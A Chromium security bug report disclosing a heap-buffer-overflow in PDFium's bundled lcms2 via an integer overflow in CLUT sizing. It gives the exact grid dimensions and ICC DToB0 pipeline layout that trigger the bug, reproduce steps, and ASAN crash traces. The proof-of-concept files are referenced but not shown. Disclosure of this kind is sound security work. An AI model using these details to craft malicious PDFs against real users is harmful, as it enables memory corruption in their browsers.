# Heap-buffer-overflow in PDFium via integer overflow in bundled lcms2 ICC CLUT allocation

| Field | Value |
|-------|-------|
| **Issue ID** | [496618639](https://issues.chromium.org/issues/496618639) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | PDFium |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | se...@gmail.com |
| **Assignee** | th...@chromium.org |
| **Created** | 2026-03-26 |
| **Bounty** | $3,000.00 |

## Description

## Summary

An integer overflow in the bundled lcms2 color management library allows a crafted ICC profile embedded in a PDF to trigger a heap-buffer-overflow read inside the Chromium renderer process. The overflow occurs in `CubeSize()`, which computes the total number of entries in a multi-dimensional color lookup table (CLUT). By constructing a five-dimensional CLUT through an ICC v4 multiProcessElements (MPE) pipeline, an attacker can cause the entry count to wrap around 32 bits while passing the existing overflow check, resulting in a drastically undersized heap allocation. The interpolation strides, computed from the original unwrapped grid dimensions, then index far past the end of the buffer during normal color transformation. The bug affects all platforms and requires no user interaction beyond opening a PDF.

## Bisect

Introducing Commit: `0bd847232` (PDFium)

- Date: 2017-08-14
- Author: Nicolas Pena
- Review: LCMS: upgrade to 2.8

The unchecked `outputChan * CubeSize(...)` multiplication has been present since lcms was first bundled into PDFium. A post-multiply overflow check was added to `CubeSize()` itself in a later lcms upgrade, but that check is bypassable with carefully chosen five-dimensional grid sizes, and the outer multiplication by `outputChan` was never checked at all.

## Root Cause

The function `CubeSize()` in `cmslut.c` computes the product of all grid dimensions for a CLUT:

```
// third_party/pdfium/third_party/lcms/src/cmslut.c
cmsUInt32Number CubeSize(const cmsUInt32Number Dims[], cmsUInt32Number b)
{
    cmsUInt32Number rv, dim;
    for (rv = 1; b > 0; b--) {
        dim = Dims[b-1];
        if (dim <= 1) return 0;
        rv *= dim;
        if (rv > UINT_MAX / dim) return 0;
    }
    return rv;
}

```

The overflow check on the last line executes after the multiplication has already been performed. When the 32-bit product wraps to a value that happens to be less than or equal to `UINT_MAX / dim`, the check passes despite the overflow. This is exploitable with five-dimensional grid sizes because the larger search space makes it practical to find dimension tuples whose cumulative product wraps to a small value while never triggering the post-multiply guard at any intermediate step.

A concrete example is the grid dimensions `[255, 161, 61, 245, 7]`. The true product is 4,295,968,825, which exceeds 2^32. At each step of the loop the post-multiply check compares the wrapped running total against `UINT_MAX / dim` and finds it acceptable, so `CubeSize` returns 1529 instead of the correct value.

The caller in `cmsStageAllocCLutFloatGranular` then multiplies by the output channel count without any further overflow check:

```
// third_party/pdfium/third_party/lcms/src/cmslut.c
// There is a potential integer overflow on conputing n and nEntries.
NewElem -> nEntries = n = outputChan * CubeSize(clutPoints, inputChan);

```

The comment acknowledges the risk but no mitigation follows. With `outputChan = 3` and `CubeSize` returning 1529, the allocation is `n = 4587` floats, or 18,348 bytes.

Independently, `_cmsComputeInterpParamsEx` derives the interpolation strides from the original, unwrapped grid sizes:

```
// third_party/pdfium/third_party/lcms/src/cmsintrp.c
p -> opta[0] = p -> nOutputs;
for (i=1; i < InputChan; i++)
    p ->opta[i] = p ->opta[i-1] * nSamples[InputChan-i];

```

For the grid `[255, 161, 61, 245, 7]` with three output channels, this produces strides `opta = {3, 21, 5145, 313845, 50529045}`. The stride `opta[2] = 5145` already exceeds the total allocation of 4587 entries, so any CLUT evaluation that steps into the third grid dimension reads past the heap buffer.

The attacker reaches this code through PDFium's ICC profile loading. A PDF declares a four-component ICCBased colorspace and embeds an ICC v4 profile whose `DToB0` tag contains an MPE pipeline with two stages: a 4-to-5 channel matrix followed by a 5-to-3 channel CLUT. The matrix stage is permitted by `Type_MPEmatrix_Read`, which accepts any channel count below `cmsMAXCHANNELS`. The overall pipeline header declares 4 input and 3 output channels, matching the CMYK colorspace, so `Type_MPE_Read`'s final consistency check passes. When PDFium calls `cmsCreateTransform`, lcms reads the `DToB0` tag (which takes priority over `AToB0` for ICC v4 profiles), constructs the pipeline with the undersized CLUT, and evaluates it during the transform's internal cache initialization. The 5D tetrahedral interpolation in `Eval5InputsFloat` then dereferences indices computed from the oversized strides, reading 2268 bytes past the end of the 18,348-byte allocation.

## Reproduce

Tested on Chromium commit `711b2435c7f04297b62a57826cb5da203f4c18a4` on macOS arm64 and Ubuntu 22.04. The bug is platform-independent.

Check out the commit and configure an ASAN build:

```
is_asan = true
is_debug = false
dcheck_always_on = false

```

Then build:

```
autoninja -C out/asan chrome

```

**Generate the malicious PDF using the attached Python script, or use the PDF file(`poc.pdf`) I uploaded directly, then open it in Chrome:**

```
python3 gen_poc.py

out/asan/Chromium.app/Contents/MacOS/Chromium --user-data-dir=./userdata poc.pdf

```

The renderer process will abort with `ERROR: AddressSanitizer: heap-buffer-overflow` in `TetrahedralInterpFloat`, reading 2268 bytes past the end of an 18348-byte CLUT allocation. The `handle_segv=2` option ensures ASAN handles the signal before Crashpad. No source modifications are required. The full ASAN trace is in `asan.txt`.

### ASAN output

```
=================================================================
==79778==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6290000d7288 at pc 0x00035b0a3470 bp 0x00016fb501d0 sp 0x00016fb501c8
READ of size 4 at 0x6290000d7288 thread T0
==79778==WARNING: invalid path to external symbolizer!
==79778==WARNING: Failed to use and restart external symbolizer!
    #0 0x00035b0a346c in TetrahedralInterpFloat+0x76c (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/148.0.7757.0/Chromium Framework:arm64+0x110a746c)
    #1 0x00035b0a5470 in Eval4InputsFloat+0x1fc (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/148.0.7757.0/Chromium Framework:arm64+0x110a9470)
    #2 0x00035b0a6c0c in Eval5InputsFloat+0x1fc (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/148.0.7757.0/Chromium Framework:arm64+0x110aac0c)
    #3 0x00035b0bc720 in _LUTeval16+0x548 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/148.0.7757.0/Chromium Framework:arm64+0x110c0720)
    #4 0x00035b0f7dd0 in cmsCreateExtendedTransform+0x880 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/148.0.7757.0/Chromium Framework:arm64+0x110fbdd0)
    #5 0x00035b0f9580 in cmsCreateTransform+0x250 (/Users/test/Desktop/src/chromium/src/out/asan/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/148.0.7757.0/Chromium Framework:arm64+0x110fd580)
......

```

The complete untruncated log is in the attached `asan.log`.

## References

- [cmslut.c CubeSize](https://source.chromium.org/chromium/chromium/src/+/main:third_party/pdfium/third_party/lcms/src/cmslut.c;l=461)
- [cmslut.c cmsStageAllocCLutFloatGranular nEntries overflow](https://source.chromium.org/chromium/chromium/src/+/main:third_party/pdfium/third_party/lcms/src/cmslut.c;l=666)
- [cmsintrp.c opta stride computation](https://source.chromium.org/chromium/chromium/src/+/main:third_party/pdfium/third_party/lcms/src/cmsintrp.c;l=144)
- [cmstypes.c Type\_MPEclut\_Read](https://source.chromium.org/chromium/chromium/src/+/main:third_party/pdfium/third_party/lcms/src/cmstypes.c;l=4422)
- [icc\_transform.cpp CreateTransformSRGB](https://source.chromium.org/chromium/chromium/src/+/main:third_party/pdfium/core/fxcodec/icc/icc_transform.cpp;l=56)

## Credit

Please use 86ac1f1587b71893ed2ad792cd7dde32 as the credit for this vulnerability. Thank you.

## Attachments

- [asan.txt](attachments/asan.txt) (text/plain, 26.0 KB)
- [gen_poc.py](attachments/gen_poc.py) (text/x-python, 10.4 KB)
- [poc.pdf](attachments/poc.pdf) (application/pdf, 19.1 KB)

## Timeline

### wf...@chromium.org (2026-03-26)

I can reproduce this.

```
[60788:12056:0326/132556.820:ERROR:google_apis\gcm\engine\registration_request.cc:291] Registration response error message: DEPRECATED_ENDPOINT
=================================================================
==60292==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x12712ba40288 at pc 0x7ffdfd15ce0e bp 0x00b7ed3fb940 sp 0x00b7ed3fb988
READ of size 4 at 0x12712ba40288 thread T0
=================================================================
==35364==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x120859b40288 at pc 0x7ffdfd15ce0e bp 0x00069ebfbcc0 sp 0x00069ebfbd08
READ of size 4 at 0x120859b40288 thread T0
    #0 0x7ffdfd15ce0d in TetrahedralInterpFloat C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsintrp.c:664:18
    #1 0x7ffdfd1602ce in Eval4InputsFloat C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsintrp.c:1065:8
    #2 0x7ffdfd1622fe in Eval5InputsFloat C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsintrp.c:1164:1
    #3 0x7ffdfd17c0bb in _LUTeval16 C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmslut.c:1333:14
    #4 0x7ffdfd1bf344 in cmsCreateExtendedTransform C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1247:13
    #5 0x7ffdfd1c0f72 in cmsCreateMultiprofileTransformTHR C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1281
    #6 0x7ffdfd1c0f72 in cmsCreateTransformTHR C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1322
    #7 0x7ffdfd1c0f72 in cmsCreateTransform C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1332:12
    #8 0x7ffdfd0dc29b in fxcodec::IccTransform::CreateTransformSRGB(class pdfium::span<unsigned char const, -1, unsigned char const *>) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fxcodec\icc\icc_transform.cpp:100:11
    #9 0x7ffdfceef123 in CPDF_IccProfile::CPDF_IccProfile(class fxcrt::RetainPtr<class CPDF_StreamAcc const>, unsigned int) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_iccprofile.cpp:27:7
    #10 0x7ffdfcedaad4 in pdfium::MakeRetain C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fxcrt\retain_ptr.h:206
    #11 0x7ffdfcedaad4 in CPDF_DocPageData::GetIccProfile(class fxcrt::RetainPtr<class CPDF_Stream const>) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:475:7
    #12 0x7ffdfceb6d22 in `anonymous namespace'::CPDF_ICCBasedCS::v_Load C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_colorspace.cpp:954:51
    #13 0x7ffdfceaffc4 in CPDF_ColorSpace::Load(class CPDF_Document *, class CPDF_Object const *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_colorspace.cpp:559:27
    #14 0x7ffdfced89a7 in CPDF_DocPageData::GetColorSpaceInternal(class CPDF_Object const *, class CPDF_Dictionary const *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:374:7
    #15 0x7ffdfced847a in CPDF_DocPageData::GetColorSpaceInternal(class CPDF_Object const *, class CPDF_Dictionary const *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:321:16
    #16 0x7ffdfced7b11 in CPDF_DocPageData::GetColorSpaceGuarded C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:296
    #17 0x7ffdfced7b11 in CPDF_DocPageData::GetColorSpace(class CPDF_Object const *, class CPDF_Dictionary const *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:288:10
    #18 0x7ffdfcecadbf in CPDF_DIB::LoadColorInfo(class CPDF_Dictionary const *, class CPDF_Dictionary const *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_dib.cpp:347:34
    #19 0x7ffdfcec594a in CPDF_DIB::LoadInternal(class CPDF_Dictionary const *, class CPDF_Dictionary const *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_dib.cpp:729:8
    #20 0x7ffdfcec86c6 in CPDF_DIB::StartLoadDIBBase(bool, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_dib.cpp:196:8
    #21 0x7ffdfcf07af8 in CPDF_PageImageCache::Entry::StartGetCachedBitmap(class CPDF_PageImageCache *, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_pageimagecache.cpp:283:60
    #22 0x7ffdfcf07340 in CPDF_PageImageCache::StartGetCachedBitmap(class fxcrt::RetainPtr<class CPDF_Image>, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_pageimagecache.cpp:191:53
    #23 0x7ffdfcef7d68 in CPDF_ImageLoader::Start(class CPDF_ImageObject const *, class CPDF_PageImageCache *, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_imageloader.cpp:35:31
    #24 0x7ffdfd3d25ce in CPDF_ImageRenderer::StartLoadDIBBase(void) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_imagerenderer.cpp:73:17
    #25 0x7ffdfd3d76f0 in CPDF_ImageRenderer::Start(class CPDF_ImageObject *, class CFX_Matrix const &, bool) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_imagerenderer.cpp:202:7
    #26 0x7ffdfd3f0881 in CPDF_RenderStatus::ContinueSingleObject(class CPDF_PageObject *, class CFX_Matrix const &, class PauseIndicatorIface *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_renderstatus.cpp:287:25
    #27 0x7ffdfd3dbfca in CPDF_ProgressiveRenderer::Continue(class PauseIndicatorIface *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\render\cpdf_progressiverenderer.cpp:95:29
    #28 0x7ffdfd44f04c in `anonymous namespace'::RenderPageImpl C:\b\s\w\ir\cache\builder\src\third_party\pdfium\fpdfsdk\cpdfsdk_renderpage.cpp:87:23
    #29 0x7ffdfd44f41d in CPDFSDK_RenderPageWithContext(class CPDF_PageRenderContext *, class CPDF_Page *, int, int, int, int, int, int, struct FPDF_COLORSCHEME_ const *, bool, class CPDFSDK_PauseAdapter *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\fpdfsdk\cpdfsdk_renderpage.cpp:117:3
    #30 0x7ffdfd47dbfa in FPDF_RenderPageBitmapWithColorScheme_Start C:\b\s\w\ir\cache\builder\src\third_party\pdfium\fpdfsdk\fpdf_progressive.cpp:84:3
    #31 0x7ffdfd47df30 in FPDF_RenderPageBitmap_Start C:\b\s\w\ir\cache\builder\src\third_party\pdfium\fpdfsdk\fpdf_progressive.cpp:127:10
    #32 0x7ffdfcc09639 in chrome_pdf::PDFiumEngine::ContinuePaint(unsigned __int64, class SkBitmap &) C:\b\s\w\ir\cache\builder\src\pdf\pdfium\pdfium_engine.cc:3598:7
    #33 0x7ffdfcc0849a in chrome_pdf::PDFiumEngine::Paint(class gfx::Rect const &, class SkBitmap &, class std::__Cr::vector<class gfx::Rect, class std::__Cr::allocator<class gfx::Rect>> &, class std::__Cr::vector<class gfx::Rect, class std::__Cr::allocator<class gfx::Rect>> &) C:\b\s\w\ir\cache\builder\src\pdf\pdfium\pdfium_engine.cc:879:11
    #34 0x7ffe1724c4d5 in chrome_pdf::PdfViewWebPlugin::DoPaint(class std::__Cr::vector<class gfx::Rect, class std::__Cr::allocator<class gfx::Rect>> const &, class std::__Cr::vector<class chrome_pdf::PaintReadyRect, class std::__Cr::allocator<class chrome_pdf::PaintReadyRect>> &, class std::__Cr::vector<class gfx::Rect, class std::__Cr::allocator<class gfx::Rect>> &) C:\b\s\w\ir\cache\builder\src\pdf\pdf_view_web_plugin.cc:2423:16
    #35 0x7ffe1724bdbc in chrome_pdf::PdfViewWebPlugin::OnPaint(class std::__Cr::vector<class gfx::Rect, class std::__Cr::allocator<class gfx::Rect>> const &, class std::__Cr::vector<class chrome_pdf::PaintReadyRect, class std::__Cr::allocator<class chrome_pdf::PaintReadyRect>> &, class std::__Cr::vector<class gfx::Rect, class std::__Cr::allocator<class gfx::Rect>> &) C:\b\s\w\ir\cache\builder\src\pdf\pdf_view_web_plugin.cc:2371:3
    #36 0x7ffdfcbe4641 in chrome_pdf::PaintManager::DoPaint(void) C:\b\s\w\ir\cache\builder\src\pdf\paint_manager.cc:379:12
    #37 0x7ffdfcbe8b30 in base::internal::DecayedFunctorTraits<void (chrome_pdf::PaintManager::*)(),base::WeakPtr<chrome_pdf::PaintManager> &&>::Invoke C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:740
    #38 0x7ffdfcbe8b30 in base::internal::InvokeHelper<1,base::internal::FunctorTraits<void (chrome_pdf::PaintManager::*&&)(),base::WeakPtr<chrome_pdf::PaintManager> &&>,void,0>::MakeItSo C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:956
    #39 0x7ffdfcbe8b30 in base::internal::Invoker<base::internal::FunctorTraits<void (chrome_pdf::PaintManager::*&&)(),base::WeakPtr<chrome_pdf::PaintManager> &&>,base::internal::BindState<1,1,0,void (chrome_pdf::PaintManager::*)(),base::WeakPtr<chrome_pdf::PaintManager> >,void ()>::RunImpl C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:1069
    #40 0x7ffdfcbe8b30 in base::internal::Invoker<struct base::internal::FunctorTraits<void (__cdecl chrome_pdf::PaintManager::*&&)(void), class base::WeakPtr<class chrome_pdf::PaintManager> &&>, struct base::internal::BindState<1, 1, 0, void (__cdecl chrome_pdf::PaintManager::*)(void), class base::WeakPtr<class chrome_pdf::PaintManager>>, (void)>::RunOnce(class base::internal::BindStateBase *) C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:982:12
    #41 0x7ffdff529728 in base::OnceCallback<void ()>::Run C:\b\s\w\ir\cache\builder\src\base\functional\callback.h:155
    #42 0x7ffdff529728 in base::TaskAnnotator::RunTaskImpl(struct base::PendingTask &) C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc:229:34
    #43 0x7ffdff4f9931 in base::TaskAnnotator::RunTask C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.h:112
    #44 0x7ffdff4f9931 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::LazyNow *) C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:475:23
    #45 0x7ffdff4f8793 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork(void) C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:346:40
    #46 0x7ffdff6672d7 in base::MessagePumpDefault::Run(class base::MessagePump::Delegate *) C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc:42:55
    #47 0x7ffdff4fb67f in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, class base::TimeDelta) C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:650:12
    #48 0x7ffdff5a225c in base::RunLoop::Run(class base::Location const &) C:\b\s\w\ir\cache\builder\src\base\run_loop.cc:135:14
    #49 0x7ffe09b0e85e in content::RendererMain(struct content::MainFunctionParams) C:\b\s\w\ir\cache\builder\src\content\renderer\renderer_main.cc:338:16
    #50 0x7ffdfb02b60f in content::RunOtherNamedProcessTypeMain(class std::__Cr::basic_string<char, struct std::__Cr::char_traits<char>, class std::__Cr::allocator<char>> const &, struct content::MainFunctionParams, class content::ContentMainDelegate *) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:762:14
    #51 0x7ffdfb02dd7b in content::ContentMainRunnerImpl::Run(void) C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1152:10
    #52 0x7ffdfb021b6f in content::RunContentProcess(struct content::ContentMainParams, class content::ContentMainRunner *) C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:358:36
    #53 0x7ffdfb022312 in content::ContentMain(struct content::ContentMainParams) C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:371:10
    #54 0x7ffdea8c2b06 in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc:191:12
    #55 0x7ff7e2144807 in MainDllLoader::Launch(struct HINSTANCE__*, class base::TimeTicks) C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:204:12
    #56 0x7ff7e2142074 in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:351:20
    #57 0x7ff7e263d043 in invoke_main D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:78
    #58 0x7ff7e263d043 in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #59 0x7fff0b47e8d6  (C:\WINDOWS\System32\KERNEL32.DLL+0x18002e8d6)
    #60 0x7fff0d0ac48b  (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18008c48b)

0x12712ba40288 is located 2268 bytes after 18348-byte region [0x12712ba3b200,0x12712ba3f9ac)
allocated by thread T0 here:
    #0 0x7ffe8a53c93f  (c:\src\asan\chromium-148.0.7755.0-win64-asan\clang_rt.asan_dynamic-x86_64.dll+0x18004c93f)
    #1 0x7ffdea8c23c3 in malloc C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win_thunk.cpp:64
    #2 0x7ffdfcea4f39 in partition_alloc::PartitionRoot::AllocInternal C:\b\s\w\ir\cache\builder\src\base\allocator\partition_allocator\src\partition_alloc\partition_root.h:2145
    #3 0x7ffdfcea4f39 in partition_alloc::PartitionRoot::AllocInline C:\b\s\w\ir\cache\builder\src\base\allocator\partition_allocator\src\partition_alloc\partition_root.h:538
    #4 0x7ffdfcea4f39 in pdfium::internal::Alloc(unsigned __int64, unsigned __int64) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fxcrt\fx_memory_pa.cpp:47:9
    #5 0x7ffdfd14ec34 in _cmsDupMem C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmserr.c:116:15
    #6 0x7ffdfd1782bc in CLUTElemDup C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmslut.c:497:56
    #7 0x7ffdfd17e199 in cmsStageDup C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmslut.c:1260
    #8 0x7ffdfd17e199 in cmsPipelineCat C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmslut.c:1620:56
    #9 0x7ffdfd14ad64 in DefaultICCintents C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmscnvrt.c:616:14
    #10 0x7ffdfd1beed0 in cmsCreateExtendedTransform C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1165:11
    #11 0x7ffdfd1c0f72 in cmsCreateMultiprofileTransformTHR C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1281
    #12 0x7ffdfd1c0f72 in cmsCreateTransformTHR C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1322
    #13 0x7ffdfd1c0f72 in cmsCreateTransform C:\b\s\w\ir\cache\builder\src\third_party\pdfium\third_party\lcms\src\cmsxform.c:1332:12
    #14 0x7ffdfd0dc29b in fxcodec::IccTransform::CreateTransformSRGB(class pdfium::span<unsigned char const, -1, unsigned char const *>) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fxcodec\icc\icc_transform.cpp:100:11
    #15 0x7ffdfceef123 in CPDF_IccProfile::CPDF_IccProfile(class fxcrt::RetainPtr<class CPDF_StreamAcc const>, unsigned int) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_iccprofile.cpp:27:7
    #16 0x7ffdfcedaad4 in pdfium::MakeRetain C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fxcrt\retain_ptr.h:206
    #17 0x7ffdfcedaad4 in CPDF_DocPageData::GetIccProfile(class fxcrt::RetainPtr<class CPDF_Stream const>) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:475:7
    #18 0x7ffdfceb6d22 in `anonymous namespace'::CPDF_ICCBasedCS::v_Load C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_colorspace.cpp:954:51
    #19 0x7ffdfceaffc4 in CPDF_ColorSpace::Load(class CPDF_Document *, class CPDF_Object const *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_colorspace.cpp:559:27
    #20 0x7ffdfced89a7 in CPDF_DocPageData::GetColorSpaceInternal(class CPDF_Object const *, class CPDF_Dictionary const *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:374:7
    #21 0x7ffdfced847a in CPDF_DocPageData::GetColorSpaceInternal(class CPDF_Object const *, class CPDF_Dictionary const *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *, class std::__Cr::set<class CPDF_Object const *, struct std::__Cr::less<class CPDF_Object const *>, class std::__Cr::allocator<class CPDF_Object const *>> *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:321:16
    #22 0x7ffdfced7b11 in CPDF_DocPageData::GetColorSpaceGuarded C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:296
    #23 0x7ffdfced7b11 in CPDF_DocPageData::GetColorSpace(class CPDF_Object const *, class CPDF_Dictionary const *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_docpagedata.cpp:288:10
    #24 0x7ffdfcecadbf in CPDF_DIB::LoadColorInfo(class CPDF_Dictionary const *, class CPDF_Dictionary const *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_dib.cpp:347:34
    #25 0x7ffdfcec594a in CPDF_DIB::LoadInternal(class CPDF_Dictionary const *, class CPDF_Dictionary const *) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_dib.cpp:729:8
    #26 0x7ffdfcec86c6 in CPDF_DIB::StartLoadDIBBase(bool, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_dib.cpp:196:8
    #27 0x7ffdfcf07af8 in CPDF_PageImageCache::Entry::StartGetCachedBitmap(class CPDF_PageImageCache *, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_pageimagecache.cpp:283:60
    #28 0x7ffdfcf07340 in CPDF_PageImageCache::StartGetCachedBitmap(class fxcrt::RetainPtr<class CPDF_Image>, class CPDF_Dictionary const *, class CPDF_Dictionary const *, bool, enum CPDF_ColorSpace::Family, bool, class CFX_STemplate<int> const &) C:\b\s\w\ir\cache\builder\src\third_party\pdfium\core\fpdfapi\page\cpdf_pageimagecache.cpp:191:53
